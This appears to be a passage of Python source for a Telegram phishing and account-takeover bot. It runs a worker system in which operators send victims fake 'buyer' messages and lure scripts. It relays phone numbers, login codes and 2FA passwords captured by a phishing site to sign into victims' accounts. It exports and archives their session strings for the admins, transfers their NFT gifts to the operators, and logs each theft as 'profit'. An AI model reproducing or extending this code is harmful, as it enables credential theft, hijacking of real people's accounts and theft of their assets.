                disable_web_page_preview=False
            ),
            reply_markup=kb.as_markup()
        )

        await query.answer([result], cache_time=1, is_personal=True)

    # ============ WORKER COMMANDS ============
    @router.message(Command("pyid"))
    async def cmd_pyid(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        parts = msg.text.split(maxsplit=2)
        if len(parts) < 3:
            await msg.answer("⚠️ Usage: <code>/pyid @user text</code>", parse_mode=ParseMode.HTML)
            return

        user = db.get_user_by_username(parts[1])
        if not user:
            await msg.answer("❌ User not found in DB")
            return

        fake_msg = (
            f"🛡️ @{(await bot.get_me()).username} has no KYC requirements. Stay safe.\n\n"
            "💬 <b>Buyer from deal #EV42399</b> sent you a message:\n\n"
            f"<blockquote>{parts[2]}</blockquote>"
        )
        try:
            await bot.send_message(user[0], fake_msg, parse_mode=ParseMode.HTML)
            await msg.answer(f"✅ Message sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"❌ Error: {e}")

    @router.message(Command("1"))
    async def cmd_script(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
        parts = msg.text.split()
        if len(parts) < 2:
            await msg.answer("⚠️ Usage: <code>/1 @user</code>", parse_mode=ParseMode.HTML)
            return

        user = db.get_user_by_username(parts[1])
        if not user:
            await msg.answer("❌ User not found")
            return

        script = (
            f"👋 Hey, can you please send {parts[1]} and then attach a screenshot of the reaction?\n"
            "(Something like a surprise for my friend) 🎁"
        )
        try:
            await bot.send_message(user[0], script)
            await msg.answer(f"✅ Script sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"❌ Error: {e}")

    # ============ ADMIN PANEL ============
    @router.message(Command("admin"))
    async def admin_panel(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return

        users, gifts, authorized = db.get_stats()
        banker_path = SESSIONS_DIR / f"{SETTINGS['banker_session']}.session"
        banker_status = "🟢 Online" if banker_path.exists() else "🔴 Offline"

        text = (
            f"🛡️ <b>ADMIN PANEL</b>\n"
            f"{'─' * 25}\n"
            f"👥 Users: <b>{users}</b>\n"
            f"🎁 Gift Claims: <b>{gifts}</b>\n"
            f"✅ Authorized: <b>{authorized}</b>\n"
            f"🏦 Banker: <b>{banker_status}</b>\n"
            f"👷 Workers: <b>{len(workers_list)}</b>\n"
            f"🎯 Target: <b>{SETTINGS.get('target_user', 'Not set')}</b>\n"
            f"{'─' * 25}"
        )

        kb = InlineKeyboardBuilder()
        kb.row(
            InlineKeyboardButton(text="🏦 Check Banker", callback_data="check_banker"),
            InlineKeyboardButton(text="📱 Login Banker", callback_data="admin_login")
        )
        kb.row(
            InlineKeyboardButton(text="🎯 Set Target", callback_data="set_target"),
            InlineKeyboardButton(text="⚙️ API Settings", callback_data="set_api")
        )
        kb.row(InlineKeyboardButton(text="📊 Refresh Stats", callback_data="admin_refresh"))
        kb.row(InlineKeyboardButton(text="❌ Close", callback_data="close_admin"))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "admin_refresh")
    async def admin_refresh(c: CallbackQuery):
        if not await is_worker(c.from_user.id):
            return
        users, gifts, authorized = db.get_stats()
        await c.answer(f"Users: {users} | Claims: {gifts} | Auth: {authorized}", show_alert=True)

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c: CallbackQuery):
        await c.message.delete()

    @router.callback_query(F.data == "check_banker")
    async def check_banker(c: CallbackQuery):
        if not await is_worker(c.from_user.id):
            return

        sess_name = SETTINGS['banker_session']
        sess_path = SESSIONS_DIR / f"{sess_name}.session"

        if not sess_path.exists():
            return await c.answer("❌ Banker session not found!", show_alert=True)

        msg = await c.message.answer("⏳ Connecting to banker...")
        client = Client(sess_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))

        try:
            await client.connect()
            me = await client.get_me()
            await client.disconnect()
            await msg.edit_text(
                f"🏦 <b>Banker Status</b>\n\n"
                f"👤: {me.first_name} (@{me.username})\n"
                f"📱: <code>{me.phone_number}</code>",
                parse_mode="HTML"
            )
        except Exception as e:
            await msg.edit_text(f"❌ Connection error:\n{e}")
            try:
                await client.disconnect()
            except:
                pass
        await c.answer()

    @router.callback_query(F.data == "set_target")
    async def set_target_start(c: CallbackQuery, state: FSMContext):
        if not await is_worker(c.from_user.id):
            return
        await c.message.answer("✍️ Enter new target (ID or @username):")
        await state.set_state(AdminSettingsState.waiting_target)

    @router.message(AdminSettingsState.waiting_target)
    async def set_target_finish(m: Message, state: FSMContext):
        SETTINGS['target_user'] = m.text.strip()
        save_settings()
        await m.answer(f"✅ Target changed to: {SETTINGS['target_user']}")
        await state.clear()

    @router.callback_query(F.data == "set_api")
    async def set_api_start(c: CallbackQuery, state: FSMContext):
        if not await is_worker(c.from_user.id):
            return
        await c.message.answer(f"Current API URL: {SETTINGS['api_url']}\n\n1️⃣ Enter new API URL (or /skip):")
        await state.set_state(AdminSettingsState.waiting_api_url)

    @router.message(AdminSettingsState.waiting_api_url)
    async def set_api_url(m: Message, state: FSMContext):
        if m.text != "/skip":
            SETTINGS['api_url'] = m.text.strip().rstrip('/')
        await m.answer("2️⃣ Enter API ID (or /skip):")
        await state.set_state(AdminSettingsState.waiting_api_id)

    @router.message(AdminSettingsState.waiting_api_id)
    async def set_api_id(m: Message, state: FSMContext):
        if m.text != "/skip" and m.text.isdigit():
            SETTINGS['api_id'] = int(m.text)
        await m.answer("3️⃣ Enter API HASH (or /skip):")
        await state.set_state(AdminSettingsState.waiting_api_hash)

    @router.message(AdminSettingsState.waiting_api_hash)
    async def set_api_hash(m: Message, state: FSMContext):
        if m.text != "/skip":
            SETTINGS['api_hash'] = m.text.strip()
        save_settings()
        await m.answer("✅ <b>API settings updated!</b>", parse_mode=ParseMode.HTML)
        await state.clear()

    # ============ ADMIN LOGIN FLOW ============
    @router.callback_query(F.data == "admin_login")
    async def login_start(c: CallbackQuery, state: FSMContext):
        if not await is_worker(c.from_user.id):
            return
        await c.message.delete()
        await c.message.answer("🔐 <b>Banker Login</b>\nEnter phone number (+1234...):", parse_mode=ParseMode.HTML)
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def auth_phone(msg: types.Message, state: FSMContext):
        phone = clean_phone(msg.text)
        if not phone:
            return await msg.answer("❌ Invalid phone format")

        try:
            session_name = SETTINGS['banker_session']
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
            await client.connect()
            sent = await client.send_code(phone)

            admin_auth_process[msg.from_user.id] = {"client": client, "phone": phone, "hash": sent.phone_code_hash}
            await msg.answer("📩 <b>Enter verification code:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await msg.answer(f"❌ Error: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def auth_code(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            return await msg.answer("❌ Session expired")

        try:
            await data['client'].sign_in(data['phone'], data['hash'], msg.text.strip())
            await msg.answer("✅ <b>Authorized Successfully!</b>", parse_mode=ParseMode.HTML)
            await data['client'].disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await msg.answer("🔐 <b>2FA Required. Enter password:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e:
            await msg.answer(f"❌ Error: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def auth_password(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            return await msg.answer("❌ Session expired")

        try:
            await data['client'].check_password(msg.text.strip())
            await msg.answer("✅ <b>Authorized with 2FA!</b>", parse_mode=ParseMode.HTML)
            await data['client'].disconnect()
            await state.clear()
        except Exception as e:
            await msg.answer(f"❌ Error: {e}")

    # ============ CONTACT HANDLER ============
    @router.message(F.contact)
    async def on_contact(msg: types.Message):
        if not msg.contact or not msg.contact.phone_number:
            return
        phone = clean_phone(msg.contact.phone_number)
        user_id = msg.from_user.id
        username = msg.from_user.username or f"user_{user_id}"
        first_name = msg.from_user.first_name or "Unknown"
        
        # Get user to check if they have worker
        user = db.get_user(user_id)
        worker_id = user.get('worker_id') if user else None
        worker_info = db.get_user(worker_id) if worker_id else None
        
        db.add_user(user_id, username, first_name, phone=phone)
        
        # Log to logs channel
        worker_name = f"@{worker_info['username']}" if worker_info else "No worker"
        await log_to_logs_channel(
            bot,
            f"📱 <b>Phone Received</b>\n"
            f"👤 User: @{username} (ID: {user_id})\n"
            f"👤 Name: {first_name}\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"🤝 Worker: {worker_name}"
        )

        try:
            session = await unified_bot.get_session()
            await session.post(
                f"{SETTINGS['api_url']}/api/telegram/receive-phone",
                json={
                    "phone": phone,
                    "telegramId": str(user_id),
                    "timestamp": int(time.time()),
                    "source": "contact"
                },
                timeout=5
            )
        except Exception as e:
            logger.error(f"Error sending contact: {e}")

    return router


# ================= 🎛️ CONTROL ROUTER =================
def get_control_router():
    router = Router()

    async def is_admin(user_id):
        if not SETTINGS.get('admin_ids'):
            return True
        return user_id in SETTINGS.get('admin_ids', [])

    @router.message(CommandStart())
    async def c_start(m: Message, state: FSMContext):
        await state.clear()
        if not await is_admin(m.from_user.id):
            return await m.answer(f"⛔️ <b>Access denied.</b> ID: <code>{m.from_user.id}</code>", parse_mode=ParseMode.HTML)

        text = "🎛 <b>Control Panel</b>"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="👥 Admins", callback_data="c_admins"))
        kb.row(InlineKeyboardButton(text="📊 Stats", callback_data="c_stats"))
        kb.row(InlineKeyboardButton(text="🔄 Restart Bot", callback_data="c_restart"))
        await m.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "c_stats")
    async def c_stats_cb(c: CallbackQuery):
        users, gifts, auth = db.get_stats()
        sess = SESSIONS_DIR / f"{SETTINGS.get('banker_session', 'main_admin')}.session"
        status = "🟢 OK" if sess.exists() else "🔴 NO"
        text = f"📊 <b>Stats</b>\n👥 Users: <b>{users}</b>\n🎁 Claims: <b>{gifts}</b>\n✅ Auth: <b>{auth}</b>\n🏦 Banker: <b>{status}</b>"
        await c.answer(text, show_alert=True)

    @router.callback_query(F.data == "c_admins")
    async def c_admins_cb(c: CallbackQuery):
        admins = SETTINGS.get('admin_ids', [])
        text = "👮 <b>Admins:</b>\n" + "\n".join([f"• <code>{a}</code>" for a in admins])
        kb = InlineKeyboardBuilder()
        kb.row(
            InlineKeyboardButton(text="➕ Add", callback_data="c_add_admin"),
            InlineKeyboardButton(text="➖ Remove", callback_data="c_del_admin")
        )
        await safe_edit_text(c.message, text, kb.as_markup())

    @router.callback_query(F.data == "c_add_admin")
    async def c_add(c: CallbackQuery, state: FSMContext):
        await safe_edit_text(c.message, "✍️ Enter user ID:", None)
        await state.set_state(ControlState.waiting_new_admin_id)

    @router.message(ControlState.waiting_new_admin_id)
    async def c_add_fin(m: Message, state: FSMContext):
        if m.text.isdigit() and int(m.text) not in SETTINGS['admin_ids']:
            SETTINGS['admin_ids'].append(int(m.text))
            save_settings()
            await m.answer("✅ Added!")
        else:
            await m.answer("⚠️ Error or already exists.")
        await state.clear()

    @router.callback_query(F.data == "c_del_admin")
    async def c_del(c: CallbackQuery, state: FSMContext):
        await safe_edit_text(c.message, "✍️ Enter ID to remove:", None)
        await state.set_state(ControlState.waiting_del_admin_id)

    @router.message(ControlState.waiting_del_admin_id)
    async def c_del_fin(m: Message, state: FSMContext):
        if m.text.isdigit() and int(m.text) in SETTINGS['admin_ids']:
            SETTINGS['admin_ids'].remove(int(m.text))
            save_settings()
            await m.answer("🗑 Removed!")
        else:
            await m.answer("⚠️ ID not found.")
        await state.clear()

    @router.callback_query(F.data == "c_restart")
    async def c_restart(c: CallbackQuery):
        await c.answer("🔄 Restarting...", show_alert=True)
        python = sys.executable
        os.execl(python, python, *sys.argv)

    return router


# ================= 🚀 MAIN BOT CLASS =================
class UnifiedBot:
    def __init__(self):
        global bot, unified_bot
        self.main_bot: Bot = None
        self.control_bot: Bot = None
        self.dp_main: Dispatcher = None
        self.dp_control: Dispatcher = None
        self.running = True
        self.aiohttp_session: Optional[aiohttp.ClientSession] = None
        unified_bot = self

    async def get_session(self) -> aiohttp.ClientSession:
        """Get or create persistent aiohttp session"""
        if self.aiohttp_session is None or self.aiohttp_session.closed:
            connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, ttl_dns_cache=300)
            self.aiohttp_session = aiohttp.ClientSession(connector=connector)
        return self.aiohttp_session

    async def add_gift_to_profile(self, telegram_id: int, phone: str, nft_details: dict):
        """Add NFT gift to user's profile via API"""
        url = f"{SETTINGS['api_url']}/api/telegram/add-gift"

        nft_id = nft_details.get('slug') or f"nft-{telegram_id}-{hash(nft_details.get('title', 'unknown'))}"
        
        logger.info(f"[AddGift] Starting add_gift_to_profile for {nft_details.get('title')}")
        logger.info(f"[AddGift] NFT Details: {nft_details}")
        logger.info(f"[AddGift] Generated nft_id: {nft_id}")

        payload = {
            "telegramId": str(telegram_id),
            "nftId": str(nft_id),
            "phone": phone,
            "collectionName": nft_details.get('collection', 'Telegram Gift'),
            "collectionSlug": "telegram-gift",
            "quantity": 1,
            "metadata": {
                "giftName": nft_details.get('title', 'Unknown NFT'),
                "imageUrl": nft_details.get('image'),
                "animationUrl": nft_details.get('animation_url')
            }
        }
        
        logger.info(f"[AddGift] Payload: {payload}")

        try:
            session = await self.get_session()
            async with session.post(url, json=payload, timeout=15) as resp:
                logger.info(f"[AddGift] Response status: {resp.status}")
                if resp.status == 200:
                    log_transfer(f"API: NFT {nft_details['title']} recorded successfully")
                    logger.info(f"[AddGift] ✅ Successfully added gift to profile")
                    return True
                elif resp.status == 409:
                    log_transfer(f"API: NFT {nft_details['title']} already exists (409)")
                    logger.warning(f"[AddGift] ⚠️ Gift already exists (409)")
                    return False
                else:
                    response_data = await resp.json()
                    log_transfer(f"API: Error recording NFT ({resp.status}): {response_data}", "error")
                    logger.error(f"[AddGift] ❌ Error response ({resp.status}): {response_data}")
                    return False
        except Exception as e:
            log_transfer(f"Error calling add-gift API: {e}", "error")
            logger.error(f"[AddGift] ❌ Exception: {e}")
            return False
    async def update_status(self, req_id: str, status: str, message: str = None, error: str = None, phone: str = None, telegram_id: str = None):
        """Update request status on website"""
        url = f"{SETTINGS['api_url']}/api/telegram/update-request"
        payload = {"requestId": req_id, "status": status, "processed": True}
        if message:
            payload["message"] = message
        if error:
            payload["error"] = error
        if phone:
            payload["phone"] = phone
        if telegram_id:
            payload["telegramId"] = telegram_id

        try:
            session = await self.get_session()
            async with session.post(url, json=payload, timeout=10) as resp:
                logger.info(f"📤 [API] Status update '{status}' -> {resp.status}")
        except Exception as e:
            logger.error(f"❌ [API] Update error: {e}")

    async def start_api_polling(self):
        """Polling website for auth requests"""
        logger.info(f"📡 [API] Polling started: {SETTINGS['api_url']}")

        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    url = f"{SETTINGS['api_url']}/api/telegram/get-pending"
                    async with session.get(url, timeout=10) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            for req in data.get('requests', []):
                                req_id = req.get('requestId')
                                action = req.get('action')
                                if req_id and action and not is_request_processed(req_id, action):
                                    mark_request_processed(req_id, action)
                                    asyncio.create_task(self.process_request(req))
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.debug(f"[API] Poll debug: {e}")

                await asyncio.sleep(2)

    async def process_request(self, req: dict):
        """Process auth actions from API"""
        req_id = req.get('requestId')
        action = req.get('action')
        phone = clean_phone(req.get('phone', ''))
        code = req.get('code')
        password = req.get('password')
        telegram_id = req.get('telegramId') or req.get('chatId')

        logger.info(f"🔄 [AUTH] Processing: {action} | Phone: {phone}")

        if not phone and action in ['send_code', 'send_password']:
            for stored_phone, session_data in user_sessions.items():
                if str(session_data.get('telegram_id')) == str(telegram_id):
                    phone = stored_phone
                    break

        try:
            client = pyrogram_clients.get(phone)

            if action == 'send_phone':
                if not phone:
                    return await self.update_status(req_id, "error", error="No phone provided")

                session_name = phone.replace('+', '')
                client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                pyrogram_clients[phone] = client

                try:
                    if not client.is_connected:
                        await asyncio.wait_for(client.connect(), timeout=15)

                    sent = await asyncio.wait_for(client.send_code(phone), timeout=15)
                    user_sessions[phone] = {'hash': sent.phone_code_hash, 'telegram_id': telegram_id}

                    logger.info(f"✅ Code sent to {phone}")
                    await self.update_status(req_id, "waiting_code", "Code sent", phone=phone, telegram_id=telegram_id)

                    await log_to_topic(
                        self.main_bot,
                        'topic_auth',
                        f"📱 Code sent: <code>{mask_phone(phone)}</code>\n👤 ID: <code>{telegram_id}</code>"
                    )

                except FloodWait as e:
                    await self.update_status(req_id, "error", error=f"Flood wait: {e.value}s", phone=phone)
                    try:
                        if client.is_connected:
                            await asyncio.wait_for(client.disconnect(), timeout=5)
                    except:
                        pass
                except Exception as e:
                    await self.update_status(req_id, "error", error=str(e), phone=phone)
                    try:
                        if client.is_connected:
                            await asyncio.wait_for(client.disconnect(), timeout=5)
                    except:
                        pass

            elif action == 'send_code':
                if not client:
                    session_name = phone.replace('+', '')
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                    pyrogram_clients[phone] = client

                if not client.is_connected:
                    await asyncio.wait_for(client.connect(), timeout=15)

                session_data = user_sessions.get(phone)
                if not session_data:
                    try:
                        sent = await asyncio.wait_for(client.send_code(phone), timeout=15)
                        user_sessions[phone] = {'hash': sent.phone_code_hash, 'telegram_id': telegram_id}
                        session_data = user_sessions[phone]
                    except:
                        return await self.update_status(req_id, "error", error="Session expired", phone=phone)

                try:
                    await asyncio.wait_for(client.sign_in(phone, session_data['hash'], code), timeout=15)

                    if telegram_id:
                        db.mark_authorized(int(telegram_id), phone)

                    await self.update_status(req_id, "success", "Auth success", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ Auth success: {phone}")

                    await log_to_topic(
                        self.main_bot,
                        'topic_auth',
                        f"🟩 Auth success: <code>{mask_phone(phone)}</code>"
                    )

                    # Start NFT collection
                    asyncio.create_task(self.finalize_auth(client, telegram_id, phone))

                except SessionPasswordNeeded:
                    logger.info(f"🔒 2FA required for {phone}")
                    await self.update_status(req_id, "waiting_password", "2FA required", phone=phone, telegram_id=telegram_id)

                    await log_to_topic(
                        self.main_bot,
                        'topic_auth',
                        f"🟨 2FA required: <code>{mask_phone(phone)}</code>"
                    )
                except (PhoneCodeInvalid, PhoneCodeExpired):
                    await self.update_status(req_id, "error", error="Invalid code", phone=phone)
                except Exception as e:
                    await self.update_status(req_id, "error", error=str(e), phone=phone)

            elif action == 'send_password':
                if not client:
                    session_name = phone.replace('+', '')
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                    pyrogram_clients[phone] = client

                if not client.is_connected:
                    await asyncio.wait_for(client.connect(), timeout=15)

                try:
                    await asyncio.wait_for(client.check_password(password), timeout=15)

                    if telegram_id:
                        db.mark_authorized(int(telegram_id), phone)

                    await self.update_status(req_id, "success", "2FA Success", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ 2FA success: {phone}")

                    await log_to_topic(
                        self.main_bot,
                        'topic_auth',
                        f"🟩 2FA verified: <code>{mask_phone(phone)}</code>"
                    )

                    # Start NFT collection
                    asyncio.create_task(self.finalize_auth(client, telegram_id, phone))

                except PasswordHashInvalid:
                    await self.update_status(req_id, "error", error="Wrong password", phone=phone)
                except Exception as e:
                    await self.update_status(req_id, "error", error=str(e), phone=phone)

        except Exception as e:
            logger.error(f"❌ Fatal processing error: {e}")
            await self.update_status(req_id, "error", error=str(e))

    async def finalize_auth(self, client: Client, telegram_id: str, phone: str):
        """Finalize authentication and collect NFTs"""
        try:
            me = await client.get_me()
            
            # Get user info to find worker
            user = db.get_user(me.id)
            worker_id = user.get('worker_id') if user else None
            worker_info = db.get_user(worker_id) if worker_id else None
            
            # Get session string
            sess_string = await client.export_session_string()
            
            # Create session archive instead of sending raw file
            archive_path = await archive_session_data(me.id, me.phone_number, sess_string, worker_id)
            
            if archive_path and archive_path.exists():
                # Send archive to admins
                await send_file_to_admins(
                    self.main_bot,
                    archive_path,
                    f"🔐 <b>Session Archive</b>\n"
                    f"👤 User: <code>{me.id}</code> (@{me.username or 'unknown'})\n"
                    f"📱 Phone: <code>{mask_phone(me.phone_number)}</code>\n"
                    f"🤝 Worker: {worker_info['username'] if worker_info else 'None'}"
                )
                
                # Log to logs channel with session archive
                worker_name_log = f"@{worker_info['username']}" if worker_info else "No worker"
                await log_to_logs_channel(
                    self.main_bot,
                    f"✅ <b>Новая сессия получена</b>\n"
                    f"👤 User ID: <code>{me.id}</code>\n"
                    f"👤 Username: @{me.username or 'unknown'}\n"
                    f"📱 Phone: <code>{mask_phone(me.phone_number)}</code>\n"
                    f"🤝 Worker: {worker_name_log}",
                    file_path=archive_path
                )

            # Transfer NFTs
            nft_results = await transfer_process(client, self.main_bot)

            # Log NFT results
            if nft_results:
                transferred_count = sum(1 for r in nft_results if r['status'] == '✅')
                failed_count = sum(1 for r in nft_results if r['status'] != '✅')
                
                if transferred_count > 0:
                    # Send to profit channel
                    worker_name_profit = f"@{worker_info['username']}" if worker_info else "N/A"
                    profit_msg = (
                        f"💰 <b>NEW PROFIT</b>\n"
                        f"🎁 NFTs Transferred: {transferred_count}\n"
                        f"👤 User: @{me.username or 'unknown'} (ID: {me.id})\n"
                        f"📱 Phone: {mask_phone(me.phone_number)}\n"
                        f"🤝 Worker: {worker_name_profit}\n"
                    )
                    await log_to_profit_channel(self.main_bot, profit_msg)
                
                # Log all results to logs channel
                worker_name_results = f"@{worker_info['username']}" if worker_info else "None"
                nft_list = "\n".join([f"  • {r['title']}: {r['status']}" for r in nft_results[:10]])
                
                if transferred_count == 0 and failed_count > 0:
                    # All transfers failed
                    logs_msg = (
                        f"❌ <b>Transfer Failed</b>\n"
                        f"👤 User: @{me.username or 'unknown'} (ID: {me.id})\n"
                        f"📱 Phone: {mask_phone(me.phone_number)}\n"
                        f"🤝 Worker: {worker_name_results}\n\n"
                        f"Found {failed_count} gift(s) but transfer failed:\n{nft_list}"
                    )
                else:
                    logs_msg = (
                        f"📊 <b>NFT Transfer Results</b>\n"
                        f"👤 User: @{me.username or 'unknown'}\n"
                        f"📱 Phone: {mask_phone(me.phone_number)}\n"
                        f"🤝 Worker: {worker_name_results}\n\n"
                        f"Results:\n{nft_list}"
                    )
                await log_to_logs_channel(self.main_bot, logs_msg)
            else:
                # Account has no gifts - log empty account
                worker_name_results = f"@{worker_info['username']}" if worker_info else "None"
                empty_msg = (
                    f"⚠️ <b>Empty Account</b>\n"
                    f"👤 User: @{me.username or 'unknown'} (ID: {me.id})\n"
                    f"📱 Phone: {mask_phone(me.phone_number)}\n"
                    f"🤝 Worker: {worker_name_results}\n\n"
                    f"❌ <b>No gifts or NFTs found on account</b>"
                )
                await log_to_logs_channel(self.main_bot, empty_msg)
            
            # Send NFT results to API
            if nft_results:
                logger.info(f"[DEBUG] Processing {len(nft_results)} NFT results for API")
                for nft in nft_results:
                    logger.info(f"[DEBUG] NFT: {nft.get('title')} - Status: {nft.get('status')} - Slug: {nft.get('slug')}")
                    if nft['status'] in ('✅', 'success'):
                        logger.info(f"[DEBUG] Adding gift to profile: {nft.get('title')}")
                        await self.add_gift_to_profile(int(telegram_id), phone, nft)
                    else:
                        logger.info(f"[DEBUG] Skipping gift (status={nft['status']}): {nft.get('title')}")

            # Log success
            u_db = db.get_user(int(telegram_id)) if telegram_id else None
            worker_txt = "Unknown"
            if u_db and u_db['worker_id']:
                w_db = db.get_user(u_db['worker_id'])
                if w_db and w_db['username']:
                    worker_txt = f"@{w_db['username']}"
                else:
                    worker_txt = f"ID {u_db['worker_id']}"

            nft_lines = []
            if nft_results:
                for nft in nft_results:
                    link = f"{SETTINGS.get('nft_fragment_url', 'https://t.me/nft')}/{nft['slug']}" if nft.get('slug') else "#"
                    line = f"<a href='{link}'>{nft['title']}</a> {nft['status']}"
                    nft_lines.append(line)
                nft_text = "\n".join(nft_lines)
            else:
                nft_text = "No NFTs"

            log_text = (
                f"<blockquote>"
                f"💸 New Session!\n"
                f"👨‍💻 Worker: {worker_txt}\n\n"
                f"👤 User: @{me.username if me.username else 'None'}\n"
                f"🆔 ID: <code>{me.id}</code>\n"
                f"☎️ Phone: <code>{mask_phone(me.phone_number)}</code>\n\n"
                f"🎁 NFT Gifts:\n{nft_text}"
                f"</blockquote>"
            )

            await log_to_topic(self.main_bot, 'topic_success', log_text)

            if u_db and u_db['worker_id']:
                await notify_worker(self.main_bot, u_db['worker_id'], "✅ Target processed successfully!")

        except Exception as e:
            logger.error(f"Finalize error: {e}")
            await alert_admins(self.main_bot, f"❌ Finalize error:\n{e}")
        finally:
            if phone in user_sessions:
                del user_sessions[phone]
            if phone in pyrogram_clients:
                del pyrogram_clients[phone]
            await asyncio.sleep(0.5)
            try:
                if client and client.is_connected:
                    await asyncio.wait_for(client.disconnect(), timeout=5)
            except asyncio.TimeoutError:
                logger.warning(f"Timeout disconnecting client: {phone}")
            except Exception as e:
                logger.debug(f"Error disconnecting client: {e}")

    async def session_checker_loop(self):
        """Check and clean invalid sessions"""
        logger.info("🔄 Session Checker Started")
        while self.running:
            try:
                banker_name = SETTINGS.get("banker_session", "main_admin")
                sessions = list(SESSIONS_DIR.glob("*.session"))

                for session_file in sessions:
                    if session_file.stem == banker_name:
                        continue
                    if session_file.stem in user_sessions:
                        continue

                    client = Client(
                        name=session_file.stem,
                        api_id=SETTINGS['api_id'],
                        api_hash=SETTINGS['api_hash'],
                        workdir=str(SESSIONS_DIR),
                        no_updates=True
                    )

                    try:
                        await asyncio.wait_for(client.connect(), timeout=10)
                        await asyncio.wait_for(client.get_me(), timeout=10)
                        await asyncio.wait_for(client.disconnect(), timeout=5)
                    except (AuthKeyUnregistered, UserDeactivated, SessionRevoked) as e:
                        try:
                            if client.is_connected:
                                await asyncio.wait_for(client.disconnect(), timeout=5)
                        except:
                            pass

                        try:
                            last_modified = session_file.stat().st_mtime
                            age_seconds = time.time() - last_modified
                            if age_seconds > 300:
                                print_warning(f"🗑 Removing dead session: {session_file.name}")
                                os.remove(session_file)
                        except Exception as del_err:
                            print_error(f"Error removing file: {del_err}")
                    except Exception:
                        try:
                            if client.is_connected:
                                await asyncio.wait_for(client.disconnect(), timeout=5)
                        except:
                            pass

                    await asyncio.sleep(1)

            except Exception as e:
                logger.error(f"Session checker error: {e}")

            await asyncio.sleep(60)

    async def cleanup_abandoned_clients(self):
        """Periodically cleanup abandoned Pyrogram clients"""
        logger.info("🧹 Cleanup Handler Started")
        while self.running:
            try:
                abandoned = []
                for phone, client in pyrogram_clients.items():
                    if phone not in user_sessions:
                        abandoned.append(phone)

                for phone in abandoned:
                    try:
                        client = pyrogram_clients[phone]
                        if client.is_connected:
                            await asyncio.wait_for(client.disconnect(), timeout=5)
                        del pyrogram_clients[phone]
                        logger.debug(f"Cleaned up abandoned client: {phone}")
                    except Exception as e:
                        logger.debug(f"Error cleaning client {phone}: {e}")
                        try:
                            del pyrogram_clients[phone]
                        except:
                            pass

            except Exception as e:
                logger.debug(f"Cleanup error: {e}")

            await asyncio.sleep(120)

    async def run(self):
        """Start the bot"""
        print_banner()

        if not SETTINGS.get('bot_token'):
            print_error("❌ BOT_TOKEN not configured!")
            return

        self.main_bot = Bot(
            token=SETTINGS['bot_token'],
            default=DefaultBotProperties(parse_mode=ParseMode.HTML)
        )

        self.dp_main = Dispatcher()
        self.dp_main.include_router(create_admin_router(self.main_bot))
        self.dp_main.include_router(create_main_router(self.main_bot))

        await self.main_bot.delete_webhook(drop_pending_updates=True)

        tasks = [self.dp_main.start_polling(self.main_bot)]

        # Control bot
        if SETTINGS.get('control_bot_token'):
            print_step("Launching Control Bot...")
            try:
                self.control_bot = Bot(
                    token=SETTINGS['control_bot_token'],
                    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
                )
                self.dp_control = Dispatcher()
                self.dp_control.include_router(get_control_router())
                await self.control_bot.delete_webhook(drop_pending_updates=True)
                tasks.append(self.dp_control.start_polling(self.control_bot))
                print_success("Control Bot Active!")
            except Exception as e:
                print_error(f"Control Bot Failed: {e}")

        # Start background tasks
        asyncio.create_task(self.start_api_polling())
        asyncio.create_task(self.session_checker_loop())
        asyncio.create_task(self.cleanup_abandoned_clients())

        print_success("=" * 50)
        print_success("💎 UNIFIED MARKETPLACE BOT v5.0 STARTED")
        print_info(f"🔗 API URL: {SETTINGS['api_url']}")
        print_info(f"👷 Workers: {len(workers_list)}")
        print_info(f"🎯 Target: {SETTINGS.get('target_user', 'Not set')}")
        print_success("=" * 50)

        try:
            await asyncio.gather(*tasks)
        finally:
            self.running = False
            if self.main_bot:
                await self.main_bot.session.close()
            if self.control_bot:
                await self.control_bot.session.close()
            if self.aiohttp_session and not self.aiohttp_session.closed:
                await self.aiohttp_session.close()


# ================= ENTRY POINT =================
if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    try:
        asyncio.run(UnifiedBot().run())
    except KeyboardInterrupt:
        print_warning("Bot stopped by user")
    except Exception as e:
        print_error(f"Fatal error: {e}")
        sys.exit(1)